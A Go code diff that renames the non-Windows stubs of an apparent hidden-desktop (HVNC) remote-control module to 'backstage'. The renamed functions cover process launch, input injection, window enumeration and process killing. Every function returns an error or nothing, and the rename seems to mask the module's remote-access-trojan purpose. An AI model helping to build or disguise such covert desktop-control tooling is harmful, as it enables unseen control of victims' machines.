@@ -7,67 +7,67 @@ import (
 	"image"
 )
 
-func InitializeHVNCDesktop() error {
-	return errors.New("HVNC not supported on this platform")
+func InitializebackstageDesktop() error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func CleanupHVNCDesktop() {}
+func CleanupbackstageDesktop() {}
 
-func SetHVNCCursorCapture(enabled bool) {}
+func SetbackstageCursorCapture(enabled bool) {}
 
-func SetHVNCDXGIEnabled(enabled bool) {}
+func SetbackstageDXGIEnabled(enabled bool) {}
 
-func GetHVNCDXGIEnabled() bool { return false }
+func GetbackstageDXGIEnabled() bool { return false }
 
-func SetHVNCUIAEnabled(enabled bool) {}
+func SetbackstageUIAEnabled(enabled bool) {}
 
-func GetHVNCUIAEnabled() bool { return false }
+func GetbackstageUIAEnabled() bool { return false }
 
 func BackstageCaptureDisplay(display int) (*image.RGBA, error) {
-	return nil, errors.New("HVNC not supported on this platform")
+	return nil, errors.New("backstage not supported on this platform")
 }
 
-func HVNCMonitorCount() int {
+func BackstageMonitorCount() int {
 	return 0
 }
 
-func StartHVNCProcess(filePath string, operaPatch bool, display int) error {
-	return errors.New("HVNC not supported on this platform")
+func StartbackstageProcess(filePath string, operaPatch bool, display int) error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCInputMouseMove(display int, x, y int32) error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageInputMouseMove(display int, x, y int32) error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCInputMouseDown(button int) error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageInputMouseDown(button int) error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCInputMouseUp(button int) error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageInputMouseUp(button int) error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCInputKeyDown(vk uint16) error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageInputKeyDown(vk uint16) error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCInputKeyUp(vk uint16) error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageInputKeyUp(vk uint16) error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCInputMouseWheel(delta int32) error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageInputMouseWheel(delta int32) error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCAutoStartExplorer() error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageAutoStartExplorer() error {
+	return errors.New("backstage not supported on this platform")
 }
 
-func HVNCKillAll() error {
-	return errors.New("HVNC not supported on this platform")
+func BackstageKillAll() error {
+	return errors.New("backstage not supported on this platform")
 }
 
-type HVNCWindowInfo struct {
+type BackstageWindowInfo struct {
 	HWND        uintptr
 	Title       string
 	X           int
@@ -80,7 +80,7 @@ type HVNCWindowInfo struct {
 	Visible     bool
 }
 
-type HVNCMonitorInfo struct {
+type BackstageMonitorInfo struct {
 	Index   int
 	Name    string
 	X       int
@@ -90,6 +90,6 @@ type HVNCMonitorInfo struct {
 	Primary bool
 }
 
-func HVNCEnumWindows() ([]HVNCWindowInfo, []HVNCMonitorInfo) {
+func BackstageEnumWindows() ([]BackstageWindowInfo, []BackstageMonitorInfo) {
 	return nil, nil
 }
